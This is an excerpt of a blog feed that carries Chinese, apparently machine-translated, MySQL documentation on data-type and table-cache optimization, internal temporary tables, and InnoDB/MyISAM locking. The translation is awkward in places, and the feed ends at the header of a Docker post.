第14.8.1.2节“InnoDB表的物理行结构”。要通过以压缩形式存储表数据来进一步减少空间，请ROW_FORMAT=COMPRESSED在创建InnoDB表时 指定 ，或在现有表上运行 myisampack命令 MyISAM。（InnoDB压缩表是可读可写的，而MyISAM压缩表是只读的。）对于MyISAM表中，如果没有任何可变长度列（VARCHAR， TEXT，或 BLOB列），一个固定大小的行格式被使用。这会更快，但可能会浪费一些空间。请参见第15.2.3节“MyISAM表格存储格式”。即使VARCHAR列中包含CREATE TABLE选项 ，您也可以提示您想要固定长度的行ROW_FORMAT=FIXED。索引表格的主要索引应尽可能短。这使得每一行的识别简单且高效。对于InnoDB表，主键列在每个二级索引条目中都是重复的，所以如果有很多二级索引，则较短的主键会节省相当多的空间。只创建您需要提高查询性能的索引。索引很适合检索，但会减慢插入和更新操作。如果您主要通过在列组合上搜索来访问表，请在其上创建一个合成索引，而不是每个列的单独索引。指数的第一部分应该是最常用的列。如果从表格中选择时总是使用多列，则索引中的第一列应该是重复次数最多的列，以便更好地压缩索引。如果长字符串列很可能在第一个字符数上有一个唯一的前缀，那么最好只索引这个前缀，使用MySQL支持在列的最左边部分创建一个索引（请参见第13.1.14节，“CREATE INDEX Syntax”）。更短的索引速度更快，不仅因为它们需要更少的磁盘空间，还因为它们还会在索引缓存中为您提供更多的点击量，因此磁盘搜索量更少。请参见 第5.1.1节“配置服务器”。加盟在某些情况下，分割成两个经常扫描的表格可能是有益的。如果它是一个动态格式的表格，并且可以使用一个较小的静态格式表格来扫描表格时可以用来查找相关的行，那么情况尤其如此。在具有相同数据类型的不同表中使用相同信息声明列，以根据相应列加快联接。保持列名简单，以便您可以在不同的表中使用相同的名称并简化连接查询。例如，在一个名为table的表中customer，使用一个列名来name代替 customer_name。为了让您的名字可移植到其他SQL服务器，请考虑将它们保持为少于18个字符。正常化通常，尽量保持所有数据不冗余（观察数据库理论中提到的 第三范式）。不必重复诸如名称和地址之类的冗长值，而是为它们分配唯一的ID，根据需要在多个较小的表中重复这些ID，并通过引用join子句中的ID来加入查询中的表。如果速度比磁盘空间更重要以及保留多个数据副本的维护成本（例如，在分析大型表中的所有数据的商业智能场景中），则可以放宽规范化规则，复制信息或创建汇总表以获得更多速度。 {———-} 8.4.2优化MySQL数据类型8.4.2.1优化数字数据8.4.2.2优化字符和字符串类型8.4.2.3优化BLOB类型8.4.2.4使用PROCEDURE ANALYZE8.4.2.1优化数字数据1234567对于可以表示为字符串或数字的唯一ID或其他值，首选数字列来对字符串进行字符串。由于较大的数值可以以比相应的字符串更少的字节存储，因此速度更快，并且需要更少的内存来传输和比较它们。如果您使用的是数字数据，在许多情况下访问数据库（使用实时连接）的信息比访问文本文件要快。数据库中的信息可能以比文本文件更紧凑的格式存储，因此访问它涉及更少的磁盘访问。您还可以将代码保存在应用程序中，因为您可以避免解析文本文件以查找行和列边界。 8.4.2.2优化字符和字符串类型123456789101112131415161718192021222324对于字符和字符串列，请遵循以下准则：如果不需要特定于语言的归类功能，请使用二进制归类顺序进行快速比较和排序操作。您可以使用 BINARY操作员在特定查询中使用二进制排序规则。在比较不同列的值时，尽可能使用相同的字符集和归类来声明这些列，以避免在运行查询时进行字符串转换。对于小于8KB大小的列值，请使用二进制 VARCHAR代替 BLOB。该GROUP BY 和ORDER BY条款可以生成临时表，这些临时表可以使用的 MEMORY存储引擎，如果原来的表不包含任何BLOB 列。如果一个表包含字符串列（如名称和地址），但许多查询不检索这些列，请考虑将字符串列拆分为单独的表，并在必要时使用具有外键的连接查询。当MySQL从一行中检索任何值时，它会读取一个包含该行所有列（可能还有其他相邻行）的数据块。保持每行较小，只有最常用的列，允许更多的行适合每个数据块。这些紧凑的表格减少了常见查询的磁盘I / O和内存使用量。在表中使用随机生成的值作为主键InnoDB时，如果可能，请使用升序值（如当前日期和时间）作为前缀。当连续的主值被物理地存储在彼此附近时，InnoDB可以更快地插入和检索它们。有关数字列通常比等效字符串列更可取的原因，请参见第8.4.2.1节“针对数字数据优化”。 8.4.2.3优化BLOB类型123456789101112131415161718存储包含文本数据的大块时，请考虑先压缩它。当整个表被压缩，则不能使用这种技术 InnoDB或MyISAM。对于包含多个列的表，为了减少不使用BLOB列的查询的内存要求，请考虑将BLOB列拆分为单独的表，并在需要时使用连接查询引用它。由于检索和显示BLOB值的性能要求可能与其他数据类型有很大的不同，因此可以将BLOB特定的表放在不同的存储设备上，甚至是单独的数据库实例中。例如，要检索BLOB可能需要大量的顺序磁盘读取，这比较适合传统硬盘驱动器而非 SSD设备。有关二进制列有时比等效BLOB列更可取的原因，请参见第8.4.2.2节“优化字符和字符串类型”VARCHAR。您可以将列值的散列存储在单独的列中，对该列进行索引并在查询中测试散列值，而不是针对非常长的文本字符串测试相等性。（使用MD5()或 CRC32()函数来生成散列值。）由于散列函数可能会为不同的输入产生重复结果，因此您仍然在查询中包含一个子句 以防止错误匹配; 性能优势来自散列值的更小，易于扫描的索引。 AND blob_column = long_string_value 8.4.2.4使用PROCEDURE ANALYZE1234567891011121314151617181920212223242526272829303132333435ANALYSE([max_elements[,max_memory]])注意PROCEDURE ANALYSE() 从MySQL 5.7.18开始已弃用，并在MySQL 8.0中删除。ANALYSE()检查查询的结果并返回结果分析，为每列提供最佳数据类型，这可能有助于减小表格大小。要获得此分析，请附加PROCEDURE ANALYSE到SELECT声明的结尾处 ：SELECT ... FROM ... WHERE ... PROCEDURE ANALYZE（[ max_elements，[ max_memory]]）例如：SELECT col1，col2 FROM table1 PROCEDURE ANALYZE（10，2000）;结果显示查询返回值的一些统计信息，并为列提出最佳数据类型。这对于检查现有表格或导入新数据后可能会有所帮助。您可能需要为参数尝试不同的设置，以便在PROCEDURE ANALYSE()不适ENUM当时不会显示 数据类型。参数是可选的，使用如下：max_elements（默认值为256）是ANALYSE()每列通知的最大不同值的数量 。这用于ANALYSE()检查最佳数据类型是否应该是类型的 ENUM; 如果有多个max_elements不同的值，则ENUM不是建议的类型。max_memory（默认8192）是ANALYSE()在尝试查找所有不同值时应分配每列的最大内存量 。一个PROCEDURE条款是不是在允许的 UNION声明。8.4.3优化许多表8.4.3.1 MySQL如何打开和关闭表格8.4.3.2在同一数据库中创建多个表的缺点一些快速保存单个查询的技术涉及将数据分割到多个表中。当表的数量达到数千甚至数百万时，处理所有这些表的开销成为新的性能考虑因素。 8.4.3.1 MySQL如何打开和关闭表格123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687当你执行mysqladmin status 命令时，你应该看到如下所示的内容：正常运行时间：426正在运行的线程：1问题：11082重新加载：1打开表格：12Open tables如果你只有六张桌子，12 的价值可能会有点令人费解。MySQL是多线程的，因此可能有很多客户端同时为给定的表发出查询。为了尽量减少多个客户端会话在同一个表上具有不同状态的问题，该表由每个并发会话独立打开。这使用额外的内存，但通常会提高性能。使用MyISAM表格，打开表格的每个客户端的数据文件都需要一个额外的文件描述符。（相比之下，索引文件描述符在所有会话之间共享。）该table_open_cache和 max_connections系统变量影响服务器保持打开的文件的最大数量。如果您增加这些值中的一个或两个，则可能会遇到操作系统对每个进程打开的文件描述符数量施加的限制。许多操作系统允许您增加打开文件的限制，但方法在系统之间差别很大。请查阅您的操作系统文档以确定是否可以增加限制以及如何这样做。table_open_cache与...有关max_connections。例如，对于200个并发运行连接，请至少指定一个表缓存大小，其中 是您执行的任何查询中每个连接的最大表数量。您还必须为临时表和文件保留一些额外的文件描述符。 200 * NN确保您的操作系统可以处理table_open_cache设置隐含的打开文件描述符的数量 。如果 table_open_cache设置得太高，MySQL可能会耗尽文件描述符并拒绝连接，无法执行查询，并且非常不可靠。您还应该考虑到MyISAM存储引擎对于每个独特的打开表格需要两个文件描述符的事实 。对于分区 MyISAM表，打开的表的每个分区都需要两个文件描述符。（还要注意，当MyISAM打开一个分区表时，它会打开这个表的每个分区，不管是否实际使用了一个给定的分区，参见 MyISAM和分区文件描述符的用法。）可以使用 --open-files-limit启动选项到mysqld。参见 第B.5.2.17节“找不到文件和类似的错误”。打开表格的缓存保存在table_open_cache条目级别 。服务器在启动时自动调整缓存大小。要明确设置大小，请table_open_cache在启动时设置 系统变量。请注意，MySQL可能暂时打开更多的表来执行查询。在下列情况下，MySQL会关闭一个未使用的表并将其从表缓存中删除：当缓存已满并且线程尝试打开不在缓存中的表时。当缓存包含多个table_open_cache条目并且缓存中 的表不再被任何线程使用时。表冲洗操作发生时。当有人发出FLUSH TABLES语句或执行 mysqladmin flush-tables或 mysqladmin refresh命令时会发生这种情况。当表缓存填满时，服务器使用以下过程来查找要使用的缓存条目：当前未使用的表格被释放，从最近使用的表格开始。如果需要打开新表，但缓存已满并且没有表可以释放，则缓存将根据需要暂时扩展。当缓存处于临时扩展状态并且表从已使用状态变为未使用状态时，表将关闭并从缓存中释放。MyISAM为每个并发访问打开 一个表。这意味着如果两个线程访问同一个表，或者一个线程在同一个查询中访问了两次表（例如，通过将表连接到它自己），则需要打开两次表。每个并发打开需要表缓存中的条目。任何MyISAM表的第一次打开 需要两个文件描述符：一个用于数据文件，一个用于索引文件。该表的每次额外使用仅为数据文件提供一个文件描述符。索引文件描述符在所有线程之间共享。如果您正在使用该语句打开一个表，则会为该线程分配一个专用表对象。此表对象不被其他线程共享，并且在线程调用或线程终止之前不会关闭。发生这种情况时，该表将放回表缓存中（如果缓存未满）。请参见 第13.2.4节“HANDLER语法”。 HANDLER tbl_name OPENHANDLER tbl_name CLOSE您可以通过检查mysqld状态变量来确定表缓存是否过小，该变量 Opened_tables指示自服务器启动以来的表开放操作数：MySQL的&gt; SHOW GLOBAL STATUS LIKE &apos;Opened_tables&apos;;+ --------------- + ------- +| 变量名| 值|+ --------------- + ------- +| Opened_tables | 2741 |+ --------------- + ------- +如果该值非常大或快速增加，即使您没有发出很多FLUSH TABLES语句，也要增加表缓存大小。请参见第5.1.7节“服务器系统变量”和 第5.1.9节“服务器状态变量”。 8.4.3.2在同一数据库中创建多个表的缺点123如果MyISAM在同一数据库目录中有多个表，则打开，关闭和创建操作会很慢。如果您SELECT 在许多不同的表上执行语句，那么当表缓存满时会有一些开销，因为对于每个必须打开的表，必须关闭另一个表。您可以通过增加表缓存中允许的条目数来减少此开销。 8.4.4在MySQL中使用内部临时表12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273在某些情况下，服务器在处理语句时创建内部临时表。用户无法直接控制何时发生。服务器在如下条件下创建临时表：对UNION 报表的评估，稍后会有一些例外情况。评估一些视图，例如那些使用TEMPTABLE算法 UNION或聚合的视图 。派生表的评估（见 第13.2.10.8节“派生表”）。为子查询或半连接实现创建的表（请参见第8.2.2节“优化子查询，派生表和视图引用”）。评估包含一个ORDER BY子句和一个不同GROUP BY子句的语句，ORDER BY或者GROUP BY包含来自除连接队列中的第一个表以外的表的列或包含该列的语句。DISTINCT结合 评估ORDER BY可能需要临时表。对于使用SQL_SMALL_RESULT 修饰符的查询，MySQL使用内存中的临时表，除非查询还包含需要磁盘存储的元素（稍后介绍）。为了评估 INSERT ... SELECT从同一个表中选择并插入到同一个表中的语句，MySQL创建一个内部临时表来存放来自该表的行 SELECT，然后将这些行插入到目标表中。请参见 第13.2.5.1节“INSERT ... SELECT语法”。评估多表 UPDATE报表。评估GROUP_CONCAT() 或COUNT(DISTINCT) 表达。要确定某个语句是否需要临时表，请使用 EXPLAIN并检查该 Extra列以查看它是否显示 Using temporary（请参见 第8.8.1节“使用EXPLAIN优化查询”）。对于派生或物化临时表格EXPLAIN 不一定会说Using temporary。当服务器创建内部临时表（无论是在内存中还是在磁盘上）时，它都会增加 Created_tmp_tables状态变量。如果服务器在磁盘上创建表（最初或通过转换内存表），它将增加 Created_tmp_disk_tables状态变量。某些查询条件会阻止使用内存中的临时表，在这种情况下，服务器会使用磁盘上的表：表中存在一列BLOB或一 TEXT列。这包括具有字符串值的用户定义变量，因为它们被视为 BLOB或 TEXT列，这取决于它们的值分别是二进制还是非二进制字符串。SELECT如果使用UNION或 UNION ALL 使用列表中 最大长度大于512（二进制字符串的字节，非二进制字符串的字符）的任何字符串列。的SHOW COLUMNS和 DESCRIBE语句中使用 BLOB作为用于某些列的类型，从而用于结果的临时表是磁盘上的表。服务器不会为UNION符合某些资格的语句使用临时表 。相反，它从临时表创建中仅保留执行结果列类型转换所需的数据结构。该表没有完全实例化，没有行被写入或读取; 行直接发送到客户端。结果是内存和磁盘需求减少，第一行发送到客户端之前的延迟更小，因为服务器不需要等到最后一个查询块被执行。EXPLAIN而优化器跟踪输出反映了这种执行策略： UNION RESULT 查询块不存在，因为该块对应于从临时表读取的部分。这些条件有资格在UNION没有临时表的情况下进行评估：工会是UNION ALL，不是 UNION或UNION DISTINCT。没有全球ORDER BY条款。联合不是&#123;INSERT | REPLACE&#125; ... SELECT ... 语句的顶级查询块 。 内部临时表存储引擎1234567891011121314151617181920212223242526272829内部临时表可以在内存中保持并且由处理MEMORY存储引擎，或者由存储在磁盘上InnoDB或 MyISAM存储引擎。如果内部临时表被创建为内存表，但变得太大，MySQL会自动将其转换为磁盘上的表。内存中临时表的最大大小取决于哪个值tmp_table_size和 max_heap_table_size更小值 。这与MEMORY显式创建的表有所不同CREATE TABLE：对于这些表，只有 max_heap_table_size系统变量决定允许表增长多少，并且没有转换为磁盘格式。所述 internal_tmp_disk_storage_engine 系统变量确定哪个存储引擎服务器使用来管理的磁盘上的内部临时表。允许的值是INNODB（默认值）和 MYISAM。注意使用时 internal_tmp_disk_storage_engine=INNODB，生成超出InnoDB 行或列限制的磁盘内部临时表的查询 将返回行大小过大或列 错误过多。解决方法是设置 internal_tmp_disk_storage_engine 为MYISAM。内部临时表格存储格式内存中的临时表由MEMORY存储引擎管理，该 引擎使用固定长度的行格式。VARCHAR并且 VARBINARY列值被填充到最大列长度，实际上将它们存储为 CHAR和BINARY列。在磁盘上的临时表由管理 InnoDB或MyISAM存储引擎（取决于 internal_tmp_disk_storage_engine 设置）。两个引擎都使用动态宽度行格式存储临时表。列只根据需​​要获取尽可能多的存储空间，与使用固定长度行的磁盘表相比，它减少了磁盘I / O和空间要求以及处理时间。对于最初在内存中创建内部临时表的语句，然后将其转换为磁盘上表，通过跳过转换步骤并在磁盘上创建表开始，可以获得更好的性能。所述 big_tables系统变量可以用来迫使内部临时表的磁盘存储。]]></content>
      <categories>
        <category>java</category>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>SQL优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL优化【锁优化】]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Foptimization-sql-lock%2F</url>
    <content type="text"><![CDATA[MySQL使用锁管理对表内容的争用 ： 内部锁定在MySQL服务器内部执行，以管理多个线程对表内容的争用。这种类型的锁定是内部的，因为它完全由服务器执行，并且不涉及其他程序。参见 第8.11.1节“内部锁定方法”。 当服务器和其他程序锁定MyISAM表文件以相互协调哪个程序可以访问表时，发生外部锁定。参见第8.11.5节“外部锁定”。 8.11.1内部锁定方法1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253本节讨论内部锁定; 即在MySQL服务器本身内执行锁定以管理多个会话对表内容的争用。这种类型的锁定是内部的，因为它完全由服务器执行，并且不涉及其他程序。对于其他程序在MySQL文件上执行的锁定，请参见第8.11.5节“外部锁定”。行级锁定表级锁定选择锁定类型行级锁定MySQL使用行级锁定为InnoDB表，以支持由多个会话并发写入权限，使其适用于多用户，高并发，和OLTP应用程序。为了避免在单个表上执行多个并发写入操作时发生死锁， InnoDB通过SELECT ... FOR UPDATE为每组预计要修改的行发布语句，即使数据更改语句稍后在事务中发生，也可以在事务启动时获取必要的锁。如果交易修改或锁定多个表，请在每个交易中以相同的顺序发布适用的报表。死锁会影响性能而不是表示严重的错误，因为它会 InnoDB自动 检测 死锁条件并回滚其中一个受影响的事务。在高并发系统上，当大量线程等待相同的锁时，死锁检测会导致速度下降。有时候，innodb_lock_wait_timeout 当死锁发生时，禁用死锁检测并依赖事务回滚的设置可能更有效 。使用innodb_deadlock_detect 配置选项可以禁用死锁检测 。行级锁定的优点：当不同的会话访问不同的行时，更少的锁冲突。回滚更少。可能长时间锁定一行。表级锁定MySQL使用表级锁的MyISAM， MEMORY和MERGE 表，只允许一个会话更新一次这些表。这种锁定级别使得这些存储引擎更适合于只读，主要读取或单用户应用程序。这些存储引擎通过始终在查询开始时一次请求所有需要的锁，并始终以相同的顺序锁定表来避免 死锁。权衡是这种策略降低了并发性; 其他要修改表的会话必须等到当前数据更改语句结束。表级锁定的优点：所需的内存相对较少（行锁定需要锁定每行或一组行的内存）在大部分表格上使用时都很快，因为只涉及一个锁。如果您经常GROUP BY 对大部分数据执行操作，或者必须频繁扫描整个表，则速度很快。 {———-} 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889MySQL授予表写入锁定如下：如果表上没有锁，请在其上写入锁。否则，将锁定请求放入写入锁定队列中。MySQL授予表读取锁定如下：如果表上没有写入锁，请在其上放置一个读取锁。否则，将锁定请求放入读锁定队列中。表格更新优先于表格检索。因此，当释放一个锁时，该锁可用于写入锁定队列中的请求，然后可用于读取锁定队列中的请求。这确保了即使桌子上有大量活动时，表格的更新也不会“ 饿死 ”SELECT。但是，如果有多个表的更新，则 SELECT语句会等待，直到没有更新。有关更改读取和写入优先级的信息，请参见第8.11.2节“表锁定问题”。您可以通过检查Table_locks_immediate和 Table_locks_waited状态变量来分析系统上的表锁争用 ，这些变量分别表示可以立即授予表锁请求的次数和需要等待的数量：MySQL的&gt; SHOW STATUS LIKE &apos;Table%&apos;;+ ----------------------- + --------- +| 变量名| 值|+ ----------------------- + --------- +| Table_locks_immediate | 1151552 || Table_locks_waited | 15324 |+ ----------------------- + --------- +性能模式锁定表还提供锁定信息。请参见 第25.11.12节“性能架构锁表”。该MyISAM存储引擎支持并发插入，减少读者和作者之间的竞争给定表：如果一个MyISAM 表有数据文件的中间没有空闲块，行总是在数据文件的末尾插入。在这种情况下，您可以自由地将一个表的并发INSERT和SELECT语句 混合使用 ， MyISAM而无需锁定。也就是说，你可以插入行到一个MyISAM表同时其他客户正在阅读它。在表中间删除或更新的行可能会产生空洞。如果存在孔，则同时插入将被禁用，但当所有孔已填充新数据时将自动再次启用插入。要控制此行为，请使用 concurrent_insert系统变量。请参见第8.11.3节“并发插入”。如果您显式获取表锁 LOCK TABLES，您可以请求 READ LOCAL锁而不是 READ锁，以使其他会话在表锁定的情况下执行并发插入。执行许多INSERT和 SELECT操作上的表 t1时并发的插入是不可能的，你可以插入行到一个临时表 temp_t1，并从临时表中的行更新真正的表：mysql&gt; LOCK TABLES t1 WRITE, temp_t1 WRITE;mysql&gt; INSERT INTO t1 SELECT * FROM temp_t1;mysql&gt; DELETE FROM temp_t1;mysql&gt;UNLOCK TABLES;选择锁定类型通常，在以下情况下，表锁优于行级锁：该表的大多数语句都是读取。该表的声明是读取和写入的混合，其中写入是对单个行的更新或删除，可以通过读取一个密钥来读取：UPDATE tbl_nameSET column= valueWHERE unique_key_col= key_value;DELETE FROM tbl_nameWHERE unique_key_col= key_value;SELECT结合并发INSERT 语句，并且很少 UPDATE或者 DELETE语句。许多扫描或GROUP BY整个表上的操作，没有任何作家。对于更高级别的锁定，您可以通过支持不同类型的锁定来更轻松地调整应用程序，因为锁定开销低于行级锁定。行级锁定以外的选项：版本控制（例如在MySQL中用于并发插入的版本），可以在多个读者的同一时间拥有一个作者。这意味着根据访问何时开始，数据库或表支持不同数据视图。这个其他常见的术语是 “ 时间旅行， ” “ 上写副本， ” 或“ 按需复制。”在许多情况下，按需复制优于行级锁定。但是，在最坏的情况下，它可以使用比使用普通锁更多的内存。而不是使用行级锁，你可以使用应用程序级锁，如提供的 GET_LOCK()和 RELEASE_LOCK()在MySQL。这些是咨询锁，因此它们只能与相互合作的应用程序一起工作。参见 第12.20节“其他功能”。 8.11.2表锁定问题1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677InnoDB表使用行级锁定，以便多个会话和应用程序可以同时读取和写入同一个表，而不会让对方等待或产生不一致的结果。对于这个存储引擎，避免使用该LOCK TABLES语句，因为它没有提供任何额外的保护，而是降低了并发性。自动行级锁定使得这些表适合于最繁忙的数据库以及最重要的数据，同时还可以简化应用程序逻辑，因为您不需要锁定和解锁表。因此， InnoDB存储引擎是MySQL中的默认设置。MySQL除了为所有存储引擎使用表锁（而不是页锁，行锁或列锁） InnoDB。锁定操作本身没有太多的开销。但是因为只有一个会话可以同时写入一个表，为了获得这些其他存储引擎的最佳性能，请将它们主要用于经常查询且很少插入或更新的表。性能考虑因素支持InnoDB锁定性能问题的解决方法性能考虑因素支持InnoDB在选择是使用InnoDB或不同的存储引擎创建表时 ，请记住表锁定的以下缺点：表锁定使许多会话可以同时从表中读取数据，但是如果会话要写入表中，它必须首先获得独占访问权，这意味着它可能必须先等待其他会话完成表。在更新期间，想要访问此特定表的所有其他会话必须等到更新完成。当会话正在等待时，表锁定会导致问题，因为磁盘已满并且在会话可继续之前需要有空闲空间。在这种情况下，所有希望访问问题表的会话也会处于等待状态，直到有更多磁盘空间可用。一个SELECT是需要长时间运行的语句防止其他会话更新表的同时，使其他场次出现缓慢或无响应。虽然会话正在等待独占访问表以进行更新，但发出SELECT语句的其他会话 将排在其后面，即使对于只读会话也会降低并发性。锁定性能问题的解决方法以下各项介绍了一些避免或减少表锁定引起的争用的方法：考虑将表切换到 InnoDB存储引擎，或者 CREATE TABLE ... ENGINE=INNODB在安装期间使用，或者使用ALTER TABLE ... ENGINE=INNODB现有的表。有关此存储引擎的更多详细信息，请参见 第14章，InnoDB存储引擎。优化SELECT语句以加快运行速度，以便锁定表的时间更短。您可能需要创建一些汇总表来执行此操作。启动mysqld的使用 --low-priority-updates。对于仅使用表级锁（如存储引擎 MyISAM，MEMORY和 MERGE），这给所有的语句更新（修改），比表低优先级 SELECT的语句。在这种情况下，SELECT 前面的场景中的第二个语句将在UPDATE语句之前执行，并且不会等待第一个语句 SELECT完成。要指定在特定连接中发出的所有更新应该以低优先级完成，请将low_priority_updates 服务器系统变量设置 为1。要给出特定的INSERT， UPDATE或 DELETE语句较低的优先级，请使用该LOW_PRIORITY 属性。要给出特定的SELECT 声明更高的优先级，请使用该 HIGH_PRIORITY属性。请参见 第13.2.9节“SELECT语法”。以 系统变量的较低值 启动mysqld， max_write_lock_count以强制MySQL临时提升SELECT 在发生特定数量的表插入后等待表的所有语句的优先级。这允许 READ在一定数量的锁定之后进行 WRITE锁定。如果你有问题 INSERT联合 SELECT，可考虑改用MyISAM表，它支持并发SELECT和 INSERT报表。（参见 第8.11.3节“并发插入”）。如果你有问题，混合 SELECT和 DELETE报表，该 LIMIT选项 DELETE可能会有帮助。请参见 第13.2.2节“删除语法”。使用SQL_BUFFER_RESULTwith SELECT语句可以帮助缩短表锁的持续时间。请参见 第13.2.9节“SELECT语法”。通过允许查询针对一个表中的列运行，而将更新限制在不同表中的列中，将表内容拆分为单独的表格可能会有所帮助。您可以将锁定代码更改 mysys/thr_lock.c为使用单个队列。在这种情况下，写入锁和读取锁具有相同的优先级，这可能有助于某些应用程序。 8.11.3并发插入1234567891011121314151617181920212223242526272829该MyISAM存储引擎支持并发插入，减少读者和作者之间的竞争给定表：如果一个MyISAM表已经在数据文件中没有孔（中删除的行），一个 INSERT语句可以执行行添加到表的末尾同时 SELECT语句正在读取表格中的行。如果有多个 INSERT语句，它们将按照顺序排列并执行，并与SELECT语句同时执行 。并发的结果INSERT可能不会立即显示。所述concurrent_insert系统变量可以被设置为修改并发插入处理。默认情况下，该变量设置为AUTO（或1），并按前面所述处理并发插入。如果 concurrent_insert设置为 NEVER（或0），则禁用并发插入。如果变量设置为ALWAYS （或2），即使对于已删除行的表，也允许在表的末尾进行并发插入。另请参阅concurrent_insert系统变量的说明。如果您正在使用二进制日志，并发插入将转换为正常的插入CREATE ... SELECT或 INSERT ... SELECT语句。这样做是为了确保您可以通过在备份操作期间应用日志来重新创建表的精确副本。请参见第5.4.4节“二进制日志”。另外，对于这些语句，在选定表上放置一个读锁，以便阻止插入到该表中。结果是该表的并发插入必须等待。有了LOAD DATA INFILE，如果你指定CONCURRENT 一个MyISAM满足并发插入的状态表（即，它包含在中间没有空闲块），其他会话可以从表中检索数据时LOAD DATA正在执行。即使没有其他会话同时使用该表，该CONCURRENT选项的使用LOAD DATA也会影响一个位的性能。如果指定HIGH_PRIORITY，则会覆盖该--low-priority-updates选项的效果（ 如果服务器是使用该选项启动的）。这也会导致并发插入不被使用。为LOCK TABLE，之间的差READ LOCAL并且READ是 READ LOCAL允许非冲突性的 INSERT语句（并发插入），而锁被保持来执行。但是，如果要在持有锁的同时使用服务器外部的进程来操作数据库，则无法使用此功能。 8.11.4元数据锁定123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103MySQL使用元数据锁定来管理对数据库对象的并发访问并确保数据一致性。元数据锁定不仅适用于表格，还适用于架构，存储的程序（过程，函数，触发器和预定事件）以及表空间。元数据锁定确实涉及一些开销，随着查询量的增加而增加。元数据争用增加了多个查询尝试访问相同对象的次数越多。元数据锁定不是表格定义缓存的替代，其互斥锁和锁定与互斥锁不同 LOCK_open。以下讨论提供了有关元数据锁定工作原理的一些信息。为确保事务可序列化，服务器不得允许一个会话在另一个会话中未完成显式或隐式启动事务中使用的表上执行数据定义语言（DDL）语句。服务器通过获取事务内使用的表上的元数据锁，并推迟释放这些锁，直到事务结束为止。表上的元数据锁可以防止对表的结构进行更改。这种锁定方式意味着一个会话中的事务正在使用的表不能在其他会话中用于DDL语句，直到事务结束。这个原则不仅适用于事务表，也适用于非事务表。假设一个会话开始一个使用事务表t 和非事务表的事务nt，如下所示：开始交易;SELECT * FROM t;SELECT * FROM nt;服务器在两端都保存了元数据锁t， nt直到事务结束。如果另一个会话尝试对任一表执行DDL或写入锁定操作，则会阻塞，直到事务结束时释放元数据锁。例如，如果第二个会话尝试执行以下任何操作，则会阻止：DROP TABLE t;ALTER TABLE t ...;DROP TABLE nt;ALTER TABLE nt ...;LOCK TABLE t ... WRITE;The相同的行为适用于The LOCK TABLES ... READ。也就是说，更新任何表（事务性或非事务性）的显式或隐式启动事务将被阻塞并被LOCK TABLES ... READ该表阻塞。如果服务器为语句有效但在执行期间失败的语句获取元数据锁，则它不会提前释放锁。锁释放仍然延迟到事务结束，因为失败的语句被写入二进制日志，并且锁保护日志一致性。在自动提交模式下，每条语句实际上是一个完整的事务，因此为语句获取的元数据锁只保留在语句的末尾。在PREPARE准备好声明后，即使在多语句事务中进行准备，也会释放在声明中获取的元数据锁定 。8.11.5外部锁定外部锁定是使用文件系统锁定来管理MyISAM多个进程对数据库表的争用。外部锁定用于单个进程（如MySQL服务器）不能被认为是需要访问表的唯一进程的情况。这里有些例子：如果运行多个使用相同数据库目录的服务器（不推荐），则每台服务器都必须启用外部锁定。如果使用myisamchk在表上执行表维护操作 MyISAM，则必须确保服务器未运行，或者服务器启用了外部锁定，以便根据需要锁定表文件以与myisamchk协调 访问表。使用myisampack打包 MyISAM表格也是如此 。如果服务器在启用外部锁定的情况下运行，则可以随时使用myisamchk进行读取操作，例如检查表。在这种情况下，如果服务器尝试更新myisamchk正在使用的表， 服务器将在继续之前等待myisamchk完成。如果使用myisamchk进行写入操作（如修复或优化表），或者如果使用 myisampack打包表，则 必须始终确保 mysqld服务器不使用表。如果您不停止mysqld，至少 在运行myisamchk之前执行 mysqladmin flush-tables。如果服务器和 myisamchk同时访问表，您的表可能会损坏。在外部锁定生效的情况下，每个需要访问表的进程在继续访问表之前都会获取表文件的文件系统锁。如果无法获取所有必需的锁，则会阻止进程访问表，直到获得锁（在当前持有锁的进程释放它们之后）。外部锁定会影响服务器性能，因为服务器在访问表之前必须等待其他进程。如果您运行单个服务器来访问给定的数据目录（通常情况下），并且在服务器运行时没有其他程序（如myisamchk）需要修改表，则不需要外部锁定。如果只 使用其他程序读取表，则不需要外部锁定，但 如果服务器在myisamchk正在读取表格时更改表，myisamchk可能会报告警告 。在禁用外部锁定的情况下，要使用 myisamchk，必须在执行myisamchk时停止服务器，否则在运行myisamchk之前锁定并刷新表。（请参见第8.12.1节“系统因素”。）为避免此要求，请使用CHECK TABLE 和REPAIR TABLE语句来检查和修复MyISAM表格。对于mysqld，外部锁定由skip_external_locking系统变量的值控制 。当这个变量被启用时，外部锁定被禁用，反之亦然。外部锁定默认是禁用的。使用--external-locking或 --skip-external-locking 选项可以在服务器启动时控制使用外部锁定。如果确实使用外部锁定选项来启用对MyISAM来自多个MySQL进程的表的更新 ，则必须确保满足以下条件：不要将查询缓存用于使用另一个进程更新的表的查询。不要使用该--delay-key-write=ALL选项启动服务器，也不要 使用DELAY_KEY_WRITE=1任何共享表的表选项。否则，可能会发生索引损坏。满足这些条件的最简单方法是始终 --external-locking与--delay-key-write=OFF和 一起使用 --query-cache-size=0。（这不是默认完成的，因为在许多设置中，混合使用上述选项很有用。）]]></content>
      <categories>
        <category>java</category>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>SQL优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[what is the docker]]></title>
    <url>%2F2018%2F03%2F24%2Fcontainer%2Fwhat-docker%2F</url>
